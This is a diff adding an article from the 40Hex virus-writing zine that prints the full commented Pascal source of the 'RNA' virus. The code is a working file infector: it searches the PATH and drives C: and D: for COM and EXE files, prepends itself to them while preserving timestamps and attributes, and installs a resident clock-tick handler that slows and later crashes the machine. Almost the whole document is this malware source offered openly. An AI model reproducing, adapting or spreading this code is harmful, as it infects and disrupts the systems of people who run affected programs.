@@ -1,0 +1,232 @@
+40Hex Issue 10 Volume 3 Number 1                                      File 003
+
+The following is the source code for the RNA virus, a Pascal virus which
+preserves the functionality of the EXE files which it infects.  It is a
+primitive virus, but is an example of a parasitic virus not written in
+assembly.
+-------------------------------------------------------------------------------
+{$i-}{$m 2048,0,24576}
+Program RNA;
+{ Commenting by Dark Angel of Phalcon/Skism }
+{ for 40Hex Issue 10 Volume 3 Number 1 }
+uses dos;
+
+const blksize=8192;                     { buffer size                        }
+      vsize=7200;                       { length of virus                    }
+      wc='*.';                          { part of file mask                  }
+      counter=blksize-1;                { location of the counter            }
+      cb=':\';                          { colon backslash                    }
+      maxinf:byte=4;                    { max # infections                   }
+      maxruns:byte=48;                  { # runs before disinfection         }
+      drives:array[3..4] of char=('C','D'); { name of the drives             }
+      imf:string[12]='ux142.rqz';       { temporary file name                }
+
+
+type vtype=array[1..vsize] of byte;     { type of buffer for storing virus   }
+     buftype=array[1..blksize] of byte; { type of buffer for file operations }
+
+var ps:string;                          { path string                        }
+    s:pathstr;                          { currently running program          }
+    ds:dirstr;                          { current directory                  }
+    ns:namestr;                         { filename of current program        }
+    es:extstr;                          { extension of current program       }
+    v:^vtype;                           { buffer for virus code              }
+    buf:^buftype;                       { buffer for file copying            }
+    count,indx,inf:byte;
+    attr,nr,nw:word;
+    sr:searchrec;                       { for find first/find next calls     }
+    f,f2:file;                          { file handles                       }
+    t:longint;                          { file time/date storage             }
+
+procedure copyf;                        { copy file                          }
+begin
+ repeat                                 { copy the file in blocks            }
+  blockread(f,buf^,blksize,nr);         { read from the source file          }
+  blockwrite(f2,buf^,nr,nw);            { write to the target file           }
+ until (eof(f));                        { stop if end of file reached        }
+ close(f);                              { close the source file              }
+ setftime(f2,t);                        { set file time/date of target       }
+ close(f2);                             { then close target file             }
+end;
+
+Procedure stripf;                       { strip virus from the file          }
+
+begin
+ assign(f,s);                           { f = handle for current file        }
+ reset(f,1);                            { prepare it for reading             }
+ getftime(f,t);                         { save file creation time/date       }
+ assign(f2,ds+imf);                     { create temporary file              }
+ rewrite(f2,1);                         { prepare for writing                }
+ seek(f,vsize);                         { go past virus                      }
+ copyf;                                 { and copy uninfected file           }
+end;
+
+procedure load;                         { load the virus from carrier file   }
+
+begin
+ assign(f,s);                           { f = handle for current file        }
+ getfattr(f,attr);                      { get its file attributes            }
+ reset(f,1);                            { and prepare it for reading         }
+ if ioresult=0 then                     { continue if no failure             }
+  begin
+   getftime(f,t);                       { get file creation time/date        }
+   blockread(f,v^,vsize,nr);            { read the virus to buffer           }
+   count:=v^[vsize]-1;                  { get the counter from the buffer    }
+                                        { and decrement it                   }
+   v^[vsize]:=maxruns;                  { reset counter in buffer            }
+   seek(f,vsize-1);                     { go to generation counter in buffer }
+   blockwrite(f,count,1,nr);            { write new counter to file          }
+   setftime(f,t);                       { restore file time/date             }
+   close(f);                            { close the file                     }
+   setfattr(f,attr);                    { restore its file attributes        }
+  end;
+end;
+
+function checkf(pth:dirstr):boolean;    { check if file already infected     }
+
+var by:array[1..27] of byte;            { buffer for checking marker bytes   }
+
+begin
+ checkf:=false;                         { default to don't infect            }
+ if pos(sr.name,'COMMAND.COM')=0 then   { don't infect COMMAND.COM           }
+ begin
+  assign(f,pth+sr.name);                { get filename                       }
+  reset(f,1);                           { open for reading                   }
+  if ioresult=0 then                    { continue if open ok                }
+   begin
+    blockread(f,by,27,nr);              { start checking the file            }
+    for indx:=1 to 27 do                { to see if the virus is             }
+     if (by[indx])<>(v^[indx]) then     { already there                      }
+      checkf:=true;                     { if not, return infect ok           }
+    close(f);                           { close the file                     }
+   end;
+ end;
+end;
+
+procedure attach(pth:dirstr);           { attach virus to start of file      }
+begin
+ inc(inf);                              { increment infection counter        }
+ assign(f2,pth+'zSqA.th');              { create temporary file              }
+ rewrite(f2,1);                         { open for writing                   }
+ if ioresult=0 then                     { continue if no errors              }
+  begin
+   assign(f,pth+sr.name);               { open file to infect                }
+   getfattr(f,attr);                    { save its attributes                }
+   reset(f,1);                          { open for reading                   }
+   getftime(f,t);                       { save its creation time/date        }
+   blockwrite(f2,v^,vsize,nr);          { write the virus to the temp file   }
+   copyf;                               { copy the file to infect to the     }
+   erase(f);                            { temp file and erase original       }
+   rename(f2,sr.name);                  { rename the temp file to the name   }
+   setfattr(f2,attr);                   { of the original and restore file   }
+  end;                                  { attributes                         }
+end;
+
+procedure rep(pth:dirstr;ext:extstr);   { replicate within a directory       }
+
+begin
+ findfirst(pth+wc+ext,hidden+archive+readonly,sr);
+ while (inf<maxinf) and (doserror=0) do { search for files to infect         }
+  begin
+   if checkf(pth) then attach(pth);     { infect if not already infected     }
+   findnext(sr);                        { then continue for other files      }
+  end;
+end;
+
+procedure wastetime;interrupt;          { interrupt 1Ch handler              }
+begin
+ inc(t);
+ inline($90/$90/$90/$90/$90/$90);       { NOP NOP NOP NOP NOP NOP            }
+ if ((t mod 8640)=8639) then inline($4C); { crash after about 8 minutes      }
+end;
+
+procedure replicate;                            { duplicate within path      }
+
+var tmp:dirstr;                                 { holds a directory name     }
+
+begin
+ while (ps<>'') do                              { while more directories     }
+  begin
+   indx:=pos(';',ps);                           { go to next directory       }
+   if indx=0 then                               { if not found, then at      }
+    begin                                       { last directory             }
+     tmp:=ps;                                   { copy directory name to     }
+     ps:='';                                    { variable                   }
+    end
+   else
+    begin
+     tmp:=copy(ps,1,indx-1);                    { copy directory name to     }
+     ps:=copy(ps,indx+1,length(ps)-indx);       { variable           }
+    end;
+   if tmp[length(tmp)]<>'\' then tmp:=tmp+'\';  { concatenate '\' if it      }
+                                                { isn't already there        }
+   rep(tmp,'cOm');                              { infect *.COM               }
+   rep(tmp,'exE');                              { infect *.EXE               }
+  end;
+end;
+
+procedure makep;                                { this makes a path if it    }
+                                                { isn't found in the system  }
+var b:byte;
+
+begin
+ getdir(0,ps);                                  { get current drive          }
+ for b:=3 to 4 do                               { do this for C: and D:      }
+  begin
+   ps:=ps+';'+drives[b]+cb+';';                 { copy each drive to path    }
+   findfirst(drives[b]+cb+wc,directory,sr);     { check if dirs on drive     }
+   while (doserror=0) and (length(ps)<240) do   { if not, continue           }
+    begin
+     ps:=ps+drives[b]+cb+sr.name+';';           { add all dirs to the path   }
+     findnext(sr);                              { do it again and again      }
+    end;
+  end;
+end;
+
+procedure grow;
+
+begin
+ inf:=0;                        { reset infection counter                    }
+ ps:=getenv('path');            { get the current path                       }
+ if ps<>'' then replicate;      { infect files if path found                 }
+ if inf<maxinf then             { if not enough files infected               }
+  begin
+   makep;                       { make a path                                }
+   replicate;                   { and then infect                            }
+  end;
+end;
+
+procedure remove;               { disinfection routine                       }
+begin
+ assign(f,s);                   { f = handle for currently running file      }
+ erase(f);                      { delete the current file                    }
+ assign(f,ds+imf);              { f = handle for disinfected copy            }
+ rename(f,ns+es);               { replace carrier file with disinfected copy }
+end;
+
+procedure runf;                 { run the original file                      }
+begin
+ exec(ds+imf,paramstr(1)+paramstr(2)+paramstr(3));
+ assign(f,ds+imf);              { delete disinfected copy                    }
+ erase(f);
+end;
+
+begin
+ new(v);                        { allocate memory to store virus             }
+ new(buf);                      { allocate memory for file operations buffer }
+ s:=paramstr(0);                { get filename of currently running program  }
+ fsplit(s,ds,ns,es);            { split to directory, name, and extension    }
+ stripf;                        { strip infected file from executable        }
+ load;                          { load the virus data to the buffer          }
+ grow;                          { infect files                               }
+ if count=0 then remove;        { disinfect if run maxruns times             }
+ runf;                          { run the original file                      }
+ if count<3 then                { slow system down if run many times         }
+  begin
+   t:=0;                        { reset count variable                       }
+   setintvec($1c,@wastetime);   { set clock tick handler                     }
+   keep(0);                     { and then stay resident                     }
+  end;
+end.
+-------------------------------------------------------------------------------
+                                                                             DA
